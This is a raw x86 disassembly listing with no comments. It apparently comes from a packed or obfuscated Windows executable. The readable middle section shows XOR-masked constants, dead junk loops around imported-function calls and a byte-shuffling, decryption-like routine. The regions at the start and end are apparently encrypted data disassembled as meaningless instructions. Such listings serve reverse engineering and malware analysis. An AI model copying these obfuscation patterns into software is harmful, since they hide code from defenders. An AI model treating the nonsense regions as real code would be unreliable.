  40a5e2:	jmp    0x2573:0x749933b5
  40a5e9:	xchg   esi,eax
  40a5ea:	call   0xb915d7de
  40a5ef:	push   edx
  40a5f0:	lock lock inc esi
  40a5f3:	pop    edx
  40a5f4:	int3   
  40a5f5:	test   BYTE PTR [ecx+esi*4],cl
  40a5f8:	and    DWORD PTR [edi-0xf],edx
  40a5fb:	lds    ecx,FWORD PTR [ecx]
  40a5fd:	shl    DWORD PTR [esi],0x87
  40a600:	jg     0x40a67a
  40a602:	xchg   esp,eax
  40a603:	jmp    0x6b0f0c8c
  40a608:	mov    ebp,0x8c98f456
  40a60d:	or     BYTE PTR [edi+0x60e7a9e4],0x63
  40a614:	add    al,0xaf
  40a616:	sub    dh,bl
  40a618:	push   edx
  40a619:	jbe    0x40a651
  40a61b:	test   BYTE PTR [eax+edx*4+0x15],bh
  40a61f:	pop    edx
  40a620:	ins    BYTE PTR es:[edi],dx
  40a621:	lds    esi,FWORD PTR [esi]
  40a623:	(bad)  
  40a624:	jmp    0xd5c0:0xa2dd0ddc
  40a62b:	xlat   BYTE PTR ds:[ebx]
  40a62c:	jnp    0x40a5b9
  40a62e:	ret    0x4a40
  40a631:	xchg   ebp,eax
  40a632:	dec    ebp
  40a633:	sub    BYTE PTR [ebx-0x74ae3aff],bh
  40a639:	inc    ebp
  40a63a:	hlt    
  40a63b:	adc    DWORD PTR ds:0x42a2c6,ecx
  40a641:	mov    ecx,DWORD PTR [ebp-0x28]
  40a644:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  40a64e:	sub    eax,edi
  40a650:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  40a65a:	xor    eax,esi
  40a65c:	cmp    eax,ecx
  40a65e:	jne    0x40a688
  40a664:	mov    eax,DWORD PTR [ebp-0x8]
  40a667:	mov    ecx,DWORD PTR [ebp-0x10]
  40a66a:	xor    eax,esi
  40a66c:	xor    ecx,esi
  40a66e:	sub    eax,ecx
  40a670:	sub    eax,edi
  40a672:	xor    eax,esi
  40a674:	mov    DWORD PTR [ebp-0x8],eax
  40a677:	mov    eax,DWORD PTR [ebp-0x10]
  40a67a:	xor    eax,esi
  40a67c:	mov    ecx,0xffcd8d8f
  40a681:	sub    ecx,eax
  40a683:	jmp    0x40a697
  40a688:	mov    eax,DWORD PTR [ebp-0x10]
  40a68b:	xor    eax,esi
  40a68d:	mov    ecx,0xffcd8d0f
  40a692:	sub    ecx,eax
  40a694:	add    ecx,DWORD PTR [ebp-0xc]
  40a697:	mov    DWORD PTR [ebp-0xc],ecx
  40a69a:	mov    eax,DWORD PTR [ebp-0x8]
  40a69d:	cmp    eax,0xf89c85a5
  40a6a2:	jne    0x4038a5
  40a6a8:	mov    DWORD PTR [ebp-0x34],0x9
  40a6af:	mov    ecx,DWORD PTR [ebp+0x8]
  40a6b2:	xor    ecx,esi
  40a6b4:	add    ecx,edi
  40a6b6:	jmp    0x40a916
  40a6bb:	lea    eax,[ecx+ebx*1]
  40a6be:	mov    DWORD PTR [ebp-0x2c],eax
  40a6c1:	mov    eax,DWORD PTR [ebp-0x58]
  40a6c4:	sub    eax,ecx
  40a6c6:	mov    DWORD PTR [ebp-0x1c],eax
  40a6c9:	mov    eax,DWORD PTR [ebp-0x1c]
  40a6cc:	mov    DWORD PTR [ebp-0x14],eax
  40a6cf:	mov    eax,DWORD PTR [ebp-0x2c]
  40a6d2:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  40a6d9:	mov    DWORD PTR [ebp-0x54],eax
  40a6dc:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40a6e3:	mov    eax,DWORD PTR [ebp-0x38]
  40a6e6:	xor    eax,esi
  40a6e8:	add    eax,edi
  40a6ea:	mov    DWORD PTR [ebp-0x10],eax
  40a6ed:	mov    eax,DWORD PTR [ebp-0x38]
  40a6f0:	xor    eax,esi
  40a6f2:	add    eax,edi
  40a6f4:	mov    DWORD PTR [ebp-0x8],eax
  40a6f7:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  40a6fe:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40a705:	mov    eax,DWORD PTR [ebp-0x38]
  40a708:	mov    edx,DWORD PTR [ebp-0x14]
  40a70b:	xor    eax,esi
  40a70d:	add    eax,edi
  40a70f:	cmp    edx,eax
  40a711:	je     0x40a90a
  40a717:	mov    eax,DWORD PTR [ebp-0x20]
  40a71a:	xor    eax,esi
  40a71c:	mov    edx,0xffcd8d0f
  40a721:	sub    edx,eax
  40a723:	add    edx,DWORD PTR [ebp-0x14]
  40a726:	mov    eax,DWORD PTR [ebp-0x20]
  40a729:	mov    ebx,DWORD PTR [ebp-0x10]
  40a72c:	xor    eax,esi
  40a72e:	add    eax,edi
  40a730:	imul   eax,ebx
  40a733:	cmp    eax,edx
  40a735:	ja     0x40a907
  40a73b:	mov    edx,DWORD PTR [ebp-0x10]
  40a73e:	mov    eax,DWORD PTR [ebp-0x14]
  40a741:	mov    ebx,DWORD PTR [ebp-0x2c]
  40a744:	sub    eax,edx
  40a746:	xor    ebx,esi
  40a748:	xor    edx,edx
  40a74a:	add    ebx,edi
  40a74c:	div    ebx
  40a74e:	mov    DWORD PTR [ebp-0x8],eax
  40a751:	mov    eax,DWORD PTR [ebp-0x44]
  40a754:	mov    edx,DWORD PTR [ebp-0x8]
  40a757:	xor    eax,esi
  40a759:	add    eax,edi
  40a75b:	cmp    edx,eax
  40a75d:	jbe    0x40a76d
  40a763:	mov    eax,DWORD PTR [ebp-0x44]
  40a766:	xor    eax,esi
  40a768:	add    eax,edi
  40a76a:	mov    DWORD PTR [ebp-0x8],eax
  40a76d:	mov    eax,DWORD PTR [ebp-0x2c]
  40a770:	mov    edx,DWORD PTR [ebp-0x8]
  40a773:	xor    eax,esi
  40a775:	add    eax,edi
  40a777:	imul   eax,edx
  40a77a:	mov    DWORD PTR [ebp-0x8],eax
  40a77d:	mov    eax,DWORD PTR [ebp-0x38]
  40a780:	mov    edx,DWORD PTR [ebp-0x8]
  40a783:	xor    eax,esi
  40a785:	add    eax,edi
  40a787:	cmp    edx,eax
  40a789:	je     0x40a8f0
  40a78f:	mov    eax,DWORD PTR [ebp-0x8]
  40a792:	mov    DWORD PTR [ebp-0x18],eax
  40a795:	mov    eax,DWORD PTR [ebp-0x10]
  40a798:	add    eax,DWORD PTR [ebp-0x54]
  40a79b:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40a7a2:	mov    DWORD PTR [ebp-0x8],eax
  40a7a5:	mov    eax,0xf89c85ba
  40a7aa:	mov    DWORD PTR [ebp-0x28],eax
  40a7ad:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40a7b4:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  40a7bb:	mov    DWORD PTR [ebp-0x30],eax
  40a7be:	mov    eax,DWORD PTR [ebp-0x1c]
  40a7c1:	xor    eax,esi
  40a7c3:	add    eax,edi
  40a7c5:	jmp    0x40a8ac
  40a7ca:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  40a7d1:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  40a7d8:	mov    eax,DWORD PTR [ebp-0x30]
  40a7db:	mov    edx,DWORD PTR [ebp-0xc]
  40a7de:	xor    eax,esi
  40a7e0:	add    eax,edi
  40a7e2:	imul   eax,edx
  40a7e5:	mov    edx,DWORD PTR [ebp-0x8]
  40a7e8:	mov    al,BYTE PTR [eax+edx*1]
  40a7eb:	mov    BYTE PTR [ebp-0x1],al
  40a7ee:	mov    eax,DWORD PTR [ebp-0x30]
  40a7f1:	mov    edx,DWORD PTR [ebp-0xc]
  40a7f4:	xor    eax,esi
  40a7f6:	add    eax,edi
  40a7f8:	imul   eax,edx
  40a7fb:	mov    edx,DWORD PTR [ebp-0x5c]
  40a7fe:	xor    edx,esi
  40a800:	add    eax,edx
  40a802:	mov    edx,DWORD PTR [ebp-0x8]
  40a805:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  40a80d:	mov    edx,DWORD PTR [ebp-0x4c]
  40a810:	xor    edx,esi
  40a812:	lea    eax,[edx+eax*1+0x3272f1]
  40a819:	movzx  edx,BYTE PTR [ebp-0x1]
  40a81d:	xor    edx,eax
  40a81f:	mov    BYTE PTR [ebp-0x1],dl
  40a822:	mov    al,BYTE PTR [ebp-0x1]
  40a825:	mov    edx,DWORD PTR [ebp-0x30]
  40a828:	mov    ebx,DWORD PTR [ebp-0xc]
  40a82b:	xor    edx,esi
  40a82d:	add    edx,edi
  40a82f:	imul   edx,ebx
  40a832:	mov    ebx,DWORD PTR [ebp-0x8]
  40a835:	mov    BYTE PTR [edx+ebx*1],al
  40a838:	mov    eax,DWORD PTR [ebp-0x30]
  40a83b:	mov    edx,DWORD PTR [ebp-0xc]
  40a83e:	xor    eax,esi
  40a840:	add    eax,edi
  40a842:	imul   eax,edx
  40a845:	mov    edx,DWORD PTR [ebp-0x8]
  40a848:	mov    al,BYTE PTR [eax+edx*1]
  40a84b:	mov    BYTE PTR [ebp-0x1],al
  40a84e:	mov    eax,DWORD PTR [ebp-0x30]
  40a851:	mov    edx,DWORD PTR [ebp-0xc]
  40a854:	xor    eax,esi
  40a856:	add    eax,edi
  40a858:	imul   eax,edx
  40a85b:	mov    edx,DWORD PTR [ebp-0x28]
  40a85e:	xor    edx,esi
  40a860:	add    eax,edx
  40a862:	mov    edx,DWORD PTR [ebp-0x8]
  40a865:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  40a86d:	mov    edx,DWORD PTR [ebp-0x50]
  40a870:	xor    edx,esi
  40a872:	lea    eax,[edx+eax*1+0x3272f1]
  40a879:	movzx  edx,BYTE PTR [ebp-0x1]
  40a87d:	xor    edx,eax
  40a87f:	mov    BYTE PTR [ebp-0x1],dl
  40a882:	mov    al,BYTE PTR [ebp-0x1]
  40a885:	mov    edx,DWORD PTR [ebp-0x30]
  40a888:	mov    ebx,DWORD PTR [ebp-0xc]
  40a88b:	xor    edx,esi
  40a88d:	add    edx,edi
  40a88f:	imul   edx,ebx
  40a892:	mov    ebx,DWORD PTR [ebp-0x8]
  40a895:	mov    BYTE PTR [edx+ebx*1],al
  40a898:	mov    eax,DWORD PTR [ebp-0x40]
  40a89b:	mov    edx,DWORD PTR [ebp-0x28]
  40a89e:	xor    eax,esi
  40a8a0:	xor    edx,esi
  40a8a2:	add    eax,edi
  40a8a4:	add    edx,edi
  40a8a6:	imul   eax,edx
  40a8a9:	add    eax,DWORD PTR [ebp-0xc]
  40a8ac:	mov    DWORD PTR [ebp-0xc],eax
  40a8af:	mov    eax,DWORD PTR [ebp-0xc]
  40a8b2:	mov    edx,DWORD PTR [ebp-0x18]
  40a8b5:	cmp    edx,eax
  40a8b7:	jb     0x40a7ca
  40a8bd:	mov    eax,DWORD PTR [ebp-0x28]
  40a8c0:	mov    edx,DWORD PTR [ebp-0x18]
  40a8c3:	xor    eax,esi
  40a8c5:	add    eax,edi
  40a8c7:	imul   eax,edx
  40a8ca:	mov    edx,DWORD PTR [ebp-0x1c]
  40a8cd:	xor    edx,esi
  40a8cf:	add    edx,edi
  40a8d1:	or     eax,edx
  40a8d3:	mov    edx,DWORD PTR [ebp-0x20]
  40a8d6:	xor    edx,esi
  40a8d8:	add    eax,edx
  40a8da:	mov    edx,DWORD PTR [ebp-0x20]
  40a8dd:	xor    edx,esi
  40a8df:	add    eax,edx
  40a8e1:	mov    edx,DWORD PTR [ebp-0x10]
  40a8e4:	lea    eax,[eax+edx*1+0x64e5e2]
  40a8eb:	jmp    0x40a8ff
  40a8f0:	mov    eax,DWORD PTR [ebp-0x20]
  40a8f3:	mov    edx,DWORD PTR [ebp-0x10]
  40a8f6:	xor    eax,esi
  40a8f8:	lea    eax,[eax+edx*1+0x3272f1]
  40a8ff:	mov    DWORD PTR [ebp-0x10],eax
  40a902:	jmp    0x40a717
  40a907:	mov    ebx,DWORD PTR [ebp-0x3c]
  40a90a:	mov    eax,DWORD PTR [ebp+0xc]
  40a90d:	xor    eax,esi
  40a90f:	lea    ecx,[ecx+eax*1+0x3272f1]
  40a916:	lea    eax,[ecx-0x3272f1]
  40a91c:	xor    eax,esi
  40a91e:	cmp    eax,0xf89c95a5
  40a923:	jne    0x40a6bb
  40a929:	dec    DWORD PTR [ebp-0x34]
  40a92c:	jne    0x40a6af
  40a932:	mov    eax,DWORD PTR [ebp+0x8]
  40a935:	mov    ecx,DWORD PTR [ebp+0xc]
  40a938:	mov    edx,DWORD PTR [ebp+0x8]
  40a93b:	xor    ecx,esi
  40a93d:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  40a944:	xor    eax,esi
  40a946:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  40a94d:	xor    edx,esi
  40a94f:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  40a956:	mov    ecx,DWORD PTR [ebp+0xc]
  40a959:	xor    ecx,esi
  40a95b:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  40a962:	mov    eax,DWORD PTR [ebp+0xc]
  40a965:	xor    eax,esi
  40a967:	add    eax,edi
  40a969:	pop    edi
  40a96a:	pop    esi
  40a96b:	pop    ebx
  40a96c:	leave  
  40a96d:	ret    0x8
  40a970:	and    DWORD PTR ds:0x42a2e6,0x42a28a
  40a97a:	xor    eax,eax
  40a97c:	sbb    DWORD PTR ds:0x42a2c2,0x42a2ae
  40a986:	inc    eax
  40a987:	ret    
  40a988:	push   ebp
  40a989:	mov    ebp,esp
  40a98b:	sub    esp,0x38
  40a98e:	movzx  eax,WORD PTR ds:0x42a2f6
  40a995:	sbb    DWORD PTR ds:0x42a276,eax
  40a99b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40a9a2:	push   ebx
  40a9a3:	add    DWORD PTR ds:0x42a2e6,0x20e2
  40a9ad:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  40a9b4:	and    DWORD PTR ds:0x42a2be,0x0
  40a9be:	jmp    0x40a9d1
  40a9c3:	xor    eax,eax
  40a9c5:	or     eax,DWORD PTR ds:0x42a2be
  40a9cb:	inc    eax
  40a9cc:	mov    ds:0x42a2be,eax
  40a9d1:	cmp    DWORD PTR ds:0x42a2be,0x1e
  40a9d8:	jae    0x40aa03
  40a9de:	cmp    DWORD PTR ds:0x42a2be,0x1f
  40a9e5:	jge    0x40aa03
  40a9eb:	jmp    0x40a9fe
  40a9f0:	push   DWORD PTR [ebp-0x1c]
  40a9f3:	push   0x42a2de
  40a9f8:	call   DWORD PTR ds:0x42a3fa
  40a9fe:	jmp    0x40a9c3
  40aa03:	mov    eax,DWORD PTR [ebp-0x4]
  40aa06:	or     DWORD PTR ds:0x42a296,0x3f2f
  40aa10:	push   esi
  40aa11:	xor    esi,esi
  40aa13:	xor    esi,DWORD PTR ds:0x42a2f2
  40aa19:	or     esi,DWORD PTR ds:0x42a28e
  40aa1f:	mov    DWORD PTR ds:0x42a2f2,esi
  40aa25:	mov    esi,0x75108aa
  40aa2a:	xor    eax,esi
  40aa2c:	push   edi
  40aa2d:	mov    DWORD PTR ds:0x42a2ce,0x1b
  40aa37:	cmp    DWORD PTR ds:0x42a2ce,0x0
  40aa3e:	je     0x40aa8f
  40aa44:	cmp    DWORD PTR ds:0x42a2ce,0x4
  40aa4b:	jb     0x40aa8f
  40aa51:	jmp    0x40aa61
  40aa56:	push   0x724e
  40aa5b:	call   DWORD PTR ds:0x42a3d6
  40aa61:	cmp    DWORD PTR ds:0x42a2ce,0x5
  40aa68:	jne    0x40aa7d
  40aa6e:	xor    edi,edi
  40aa70:	xor    edi,DWORD PTR ds:0x42a2ce
  40aa76:	dec    edi
  40aa77:	mov    DWORD PTR ds:0x42a2ce,edi
  40aa7d:	mov    edi,DWORD PTR ds:0x42a2ce
  40aa83:	dec    edi
  40aa84:	mov    DWORD PTR ds:0x42a2ce,edi
  40aa8a:	jmp    0x40aa37
  40aa8f:	mov    edi,0x3272f1
  40aa94:	add    eax,edi
  40aa96:	mov    DWORD PTR [ebp-0x1c],eax
  40aa99:	and    DWORD PTR ds:0x42a26e,0x0
  40aaa3:	jmp    0x40aab3
  40aaa8:	mov    eax,ds:0x42a26e
  40aaad:	inc    eax
  40aaae:	mov    ds:0x42a26e,eax
  40aab3:	cmp    DWORD PTR ds:0x42a26e,0x1b
  40aaba:	jae    0x40aae6
  40aac0:	cmp    DWORD PTR ds:0x42a26e,0x24
  40aac7:	ja     0x40aae6
  40aacd:	jmp    0x40aae1
  40aad2:	push   DWORD PTR [ebp-0x24]
  40aad5:	push   DWORD PTR [ebp-0x1c]
  40aad8:	push   DWORD PTR [ebp-0x28]
  40aadb:	call   DWORD PTR ds:0x42a3da
  40aae1:	jmp    0x40aaa8
  40aae6:	mov    eax,DWORD PTR [ebp+0x14]
  40aae9:	sub    DWORD PTR ds:0x42a28a,0x606e
  40aaf3:	test   eax,eax
  40aaf5:	je     0x40ab5c
  40aafb:	mov    eax,DWORD PTR [ebp+0x14]
  40aafe:	mov    eax,DWORD PTR [eax]
  40ab00:	and    DWORD PTR ds:0x42a2fe,0x0
  40ab0a:	jmp    0x40ab1c
  40ab0f:	mov    ebx,DWORD PTR ds:0x42a2fe
  40ab15:	inc    ebx
  40ab16:	mov    DWORD PTR ds:0x42a2fe,ebx
  40ab1c:	cmp    DWORD PTR ds:0x42a2fe,0x11
  40ab23:	jae    0x40ab59
  40ab29:	cmp    DWORD PTR ds:0x42a2fe,0x1c
  40ab30:	jge    0x40ab59
  40ab36:	jmp    0x40ab54
  40ab3b:	push   DWORD PTR [ebp-0x20]
  40ab3e:	push   DWORD PTR [ebp-0x10]
  40ab41:	push   0x1b8e
  40ab46:	push   DWORD PTR [ebp-0xc]
  40ab49:	push   0x42a28e
  40ab4e:	call   DWORD PTR ds:0x42a3de
  40ab54:	jmp    0x40ab0f
  40ab59:	mov    DWORD PTR [ebp-0x1c],eax
  40ab5c:	sub    DWORD PTR ds:0x42a2f2,0x6975
  40ab66:	mov    eax,DWORD PTR [ebp-0x4]
  40ab69:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  40ab73:	xor    eax,esi
  40ab75:	add    eax,edi
  40ab77:	mov    ebx,DWORD PTR ds:0x42a306
  40ab7d:	mov    ebx,DWORD PTR [ebx]
  40ab7f:	and    DWORD PTR ds:0x42a2e6,ebx
  40ab85:	mov    DWORD PTR [ebp-0x8],eax
  40ab88:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  40ab92:	mov    eax,DWORD PTR [ebp-0xc]
  40ab95:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  40ab9f:	xor    eax,esi
  40aba1:	add    eax,edi
  40aba3:	dec    DWORD PTR ds:0x42a2be
  40aba9:	mov    DWORD PTR [ebp-0x24],eax
  40abac:	mov    eax,DWORD PTR [ebp-0x4]
  40abaf:	and    DWORD PTR ds:0x42a2be,0x0
  40abb9:	jmp    0x40abcb
  40abbe:	mov    ebx,DWORD PTR ds:0x42a2be
  40abc4:	inc    ebx
  40abc5:	mov    DWORD PTR ds:0x42a2be,ebx
  40abcb:	cmp    DWORD PTR ds:0x42a2be,0x13
  40abd2:	jae    0x40ac19
  40abd8:	cmp    DWORD PTR ds:0x42a2be,0x4
  40abdf:	jb     0x40ac19
  40abe5:	jmp    0x40abfa
  40abea:	push   0x68db
  40abef:	push   0x42a266
  40abf4:	call   DWORD PTR ds:0x42a40a
  40abfa:	cmp    DWORD PTR ds:0x42a2be,0x3
  40ac01:	jne    0x40ac14
  40ac07:	mov    ebx,DWORD PTR ds:0x42a2be
  40ac0d:	inc    ebx
  40ac0e:	mov    DWORD PTR ds:0x42a2be,ebx
  40ac14:	jmp    0x40abbe
  40ac19:	xor    eax,esi
  40ac1b:	movzx  ebx,WORD PTR ds:0x42a266
  40ac22:	or     DWORD PTR ds:0x42a2ae,ebx
  40ac28:	add    eax,edi
  40ac2a:	mov    DWORD PTR [ebp-0x30],eax
  40ac2d:	mov    ebx,DWORD PTR [ebp-0x4]
  40ac30:	sbb    DWORD PTR ds:0x42a2c2,edi
  40ac36:	xor    ebx,esi
  40ac38:	and    DWORD PTR ds:0x42a292,0x0
  40ac42:	jmp    0x40ac52
  40ac47:	mov    eax,ds:0x42a292
  40ac4c:	inc    eax
  40ac4d:	mov    ds:0x42a292,eax
  40ac52:	cmp    DWORD PTR ds:0x42a292,0x1c
  40ac59:	jae    0x40ac82
  40ac5f:	cmp    DWORD PTR ds:0x42a292,0x26
  40ac66:	jbe    0x40ac82
  40ac6c:	jmp    0x40ac7d
  40ac71:	push   DWORD PTR [ebp-0x1c]
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42a3e2
  40ac7d:	jmp    0x40ac47
  40ac82:	add    ebx,edi
  40ac84:	mov    eax,DWORD PTR [ebp-0x24]
  40ac87:	sbb    DWORD PTR ds:0x42a2d2,0x3c99
  40ac91:	sub    eax,edi
  40ac93:	adc    DWORD PTR ds:0x42a2be,0x42a266
  40ac9d:	lea    ecx,[ebx-0x3272f1]
  40aca3:	inc    DWORD PTR ds:0x42a272
  40aca9:	xor    eax,esi
  40acab:	xor    ecx,esi
  40acad:	cmp    ecx,eax
  40acaf:	mov    DWORD PTR ds:0x42a28e,0x7ce
  40acb9:	je     0x40f5ba
  40acbf:	mov    eax,DWORD PTR [ebp-0x4]
  40acc2:	xor    eax,esi
  40acc4:	add    eax,edi
  40acc6:	mov    DWORD PTR ds:0x42a2be,0x2860
  40acd0:	cmp    ebx,eax
  40acd2:	jne    0x40f597
  40acd8:	xor    DWORD PTR ds:0x42a27e,0x42a2f2
  40ace2:	push   DWORD PTR [ebp+0x8]
  40ace5:	call   0x424fe2
  40acea:	mov    DWORD PTR [ebp-0x14],eax
  40aced:	and    DWORD PTR ds:0x42a2ca,0x0
  40acf7:	jmp    0x40ad07
  40acfc:	mov    eax,ds:0x42a2ca
  40ad01:	inc    eax
  40ad02:	mov    ds:0x42a2ca,eax
  40ad07:	cmp    DWORD PTR ds:0x42a2ca,0x1f
  40ad0e:	jae    0x40ad4c
  40ad14:	cmp    DWORD PTR ds:0x42a2ca,0xa
  40ad1b:	jge    0x40ad4c
  40ad21:	jmp    0x40ad2f
  40ad26:	push   DWORD PTR [ebp-0x18]
  40ad29:	call   DWORD PTR ds:0x42a3ea
  40ad2f:	cmp    DWORD PTR ds:0x42a2ca,0x9
  40ad36:	jne    0x40ad47
  40ad3c:	mov    eax,ds:0x42a2ca
  40ad41:	inc    eax
  40ad42:	mov    ds:0x42a2ca,eax
  40ad47:	jmp    0x40acfc
  40ad4c:	mov    eax,DWORD PTR [ebp-0x4]
  40ad4f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad52:	add    DWORD PTR ds:0x42a2a6,0x42a28e
  40ad5c:	jmp    0x40d0d8
  40ad61:	sub    bl,BYTE PTR [ebp-0xd]
  40ad64:	mov    BYTE PTR es:[esi+0x15a851a2],al
  40ad6b:	pop    ds
  40ad6c:	xor    edi,0x3b
  40ad6f:	inc    edi
  40ad70:	add    dh,BYTE PTR [ebx]
  40ad72:	icebp  
  40ad73:	add    DWORD PTR [ebx-0x7c7ca1de],0xffffffbc
  40ad7a:	cs jne 0x40adb0
  40ad7d:	xor    eax,0x9b6217fa
  40ad82:	dec    esi
  40ad84:	test   DWORD PTR [edi],edi
  40ad86:	pusha  
  40ad87:	jns    0x40ada1
  40ad89:	(bad)  
  40ad8a:	mov    esp,0x7ab3745a
  40ad8f:	mov    bh,0x89
  40ad91:	push   ds
  40ad92:	das    
  40ad93:	push   esp
  40ad94:	jmp    0x40ad4a
  40ad96:	dec    ecx
  40ad97:	aas    
  40ad98:	ins    BYTE PTR es:[edi],dx
  40ad99:	mov    ah,0x3c
  40ad9b:	push   ebp
  40ad9c:	adc    al,BYTE PTR [ecx]
  40ad9e:	ja     0x40ade2
  40ada0:	jb     0x40adf2
  40ada2:	xchg   esi,eax
  40ada3:	xor    ah,BYTE PTR [esi+edi*1-0x344591f5]
  40adaa:	push   ecx
  40adab:	or     ecx,ebp
  40adad:	les    edi,FWORD PTR [edi]
  40adaf:	jae    0x40ada7
  40adb1:	sbb    bh,BYTE PTR [edi]
  40adb3:	cs jmp 0x40ad87
  40adb6:	lahf   
  40adb7:	cmp    al,0x1f
  40adb9:	sbb    al,dl
  40adbb:	lds    esp,FWORD PTR [eax+0x5f4038bc]
  40adc1:	sub    al,0xeb
  40adc3:	mov    esi,ebp
  40adc5:	out    0xfa,al
  40adc7:	push   ds
  40adc8:	dec    edx
  40adc9:	jge    0x40ada1
  40adcb:	mov    al,ds:0xf67b790a
  40add0:	mov    al,ds:0xac0aded1
  40add5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add6:	icebp  
  40add7:	dec    edx
  40add8:	outs   dx,DWORD PTR ds:[esi]
  40add9:	test   BYTE PTR [esi-0x3861eb01],0x62
  40ade0:	mov    eax,0x708b7e37
  40ade5:	cwde   
  40ade6:	push   edi
  40ade7:	repz push edi
  40ade9:	stos   DWORD PTR es:[edi],eax
  40adea:	in     al,0xc4
  40adec:	mov    eax,ds:0x2c10283a
  40adf1:	pop    ebp
  40adf2:	mov    bl,0x26
  40adf4:	mov    ah,0x9e
  40adf6:	cmp    ebx,DWORD PTR [ecx-0x37530877]
  40adfc:	ins    DWORD PTR es:[edi],dx
  40adfd:	and    ah,BYTE PTR [ebx-0x47]
  40ae00:	add    dl,0xb6
  40ae03:	bound  eax,QWORD PTR [ecx+0x762338a1]
  40ae09:	shr    eax,0xc0
  40ae0c:	xchg   ebx,eax
  40ae0d:	div    DWORD PTR [eax]
  40ae0f:	aas    
  40ae10:	cmp    BYTE PTR [eax+0x3ce53b8a],0x7
  40ae17:	jns    0x40ae1b
  40ae19:	cli    
  40ae1a:	jmp    FWORD PTR [ebx-0x6]
  40ae1d:	mov    BYTE PTR [edi-0x6735bfbd],0xec
  40ae24:	std    
  40ae25:	dec    ebp
  40ae26:	mov    esi,ebx
  40ae28:	leave  
  40ae29:	push   edx
  40ae2a:	loope  0x40ae03
  40ae2c:	bound  ebx,QWORD PTR [eax]
  40ae2e:	loop   0x40ae7c
  40ae30:	jecxz  0x40ae62
  40ae32:	stc    
  40ae33:	xchg   ebp,eax
  40ae34:	jnp    0x40aeb5
  40ae36:	es retf 0xa761
  40ae3a:	js     0x40ae9c
  40ae3c:	jp     0x40ae89
  40ae3e:	xor    eax,0xdde7b02
  40ae43:	dec    esi
  40ae44:	sub    eax,0xeea55b91
  40ae49:	imul   ebx,DWORD PTR [ebp-0x2a],0x621fa581
  40ae50:	adc    DWORD PTR [eax],edx
  40ae52:	sub    al,0x4e
  40ae54:	daa    
  40ae55:	leave  
  40ae56:	mov    bh,0xc0
  40ae58:	pusha  
  40ae59:	dec    edi
  40ae5a:	aaa    
  40ae5b:	adc    BYTE PTR [edx+eax*2],dl
  40ae5e:	sbb    esi,ebx
  40ae60:	(bad)  
  40ae61:	cmc    
  40ae62:	aas    
  40ae63:	aad    0x3
  40ae65:	cmpxchg8b QWORD PTR [esi-0x2fca6bf3]
  40ae6c:	fist   DWORD PTR [eax]
  40ae6e:	mov    bl,0xcd
  40ae70:	mov    esi,0x94bab3b9
  40ae75:	in     eax,0xc3
  40ae77:	or     al,0xa3
  40ae79:	xor    al,0xb4
  40ae7b:	xchg   esp,eax
  40ae7c:	loopne 0x40ae3b
  40ae7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae7f:	xchg   esi,eax
  40ae80:	xor    al,0xc4
  40ae82:	aas    
  40ae83:	lea    ebx,[ecx]
  40ae85:	add    ch,BYTE PTR [ebx-0x6b6894e]
  40ae8b:	fcom   QWORD PTR [ebx]
  40ae8d:	addr16 mov edi,0x6384850a
  40ae93:	xchg   esi,eax
  40ae94:	aaa    
  40ae95:	sbb    edx,edi
  40ae97:	rol    BYTE PTR [ecx],1
  40ae99:	push   eax
  40ae9a:	push   0xffffffc7
  40ae9c:	in     eax,0x91
  40ae9e:	jns    0x40aeae
  40aea0:	mov    ebx,0xea536803
  40aea5:	mov    eax,0x39c70cbc
  40aeaa:	add    al,0x7b
  40aeac:	xor    bh,BYTE PTR [ebx+0x25a64e56]
  40aeb2:	mov    ebx,0x5f05e875
  40aeb7:	js     0x40ae8a
  40aeb9:	jecxz  0x40ae58
  40aebb:	fucomip st,st(4)
  40aebd:	or     esp,DWORD PTR [ecx]
  40aebf:	sub    esi,DWORD PTR ds:0x2427b5c6
  40aec5:	sbb    eax,0x519ec53b
  40aeca:	xchg   edx,eax
  40aecb:	or     BYTE PTR [edx],cl
  40aecd:	jecxz  0x40aeb1
  40aecf:	add    BYTE PTR [ebx+0x3cbefbd3],ah
  40aed5:	push   ecx
  40aed6:	pop    eax
  40aed7:	in     eax,dx
  40aed8:	mov    al,ds:0x27b636a5
  40aedd:	stos   DWORD PTR es:[edi],eax
  40aede:	xor    eax,0xf4b5ccf9
  40aee3:	push   0x20
  40aee5:	add    cl,BYTE PTR [ebx-0x35]
  40aee8:	and    edi,DWORD PTR [edi+0x10]
  40aeeb:	in     al,0xc2
  40aeed:	add    al,0xeb
  40aeef:	push   0x90bd8ac3
  40aef4:	popf   
  40aef5:	mov    cl,0xea
  40aef7:	mov    ds:0xf720684c,al
  40aefc:	retf   
  40aefd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aefe:	(bad)  
  40af00:	push   ecx
  40af01:	pop    edx
  40af02:	add    eax,0xe272e759
  40af07:	cmp    al,0x8a
  40af09:	clc    
  40af0a:	lahf   
  40af0b:	ret    0x29ac
  40af0e:	push   edi
  40af0f:	loop   0x40af76
  40af11:	test   al,0xfb
  40af13:	and    ecx,DWORD PTR [esi]
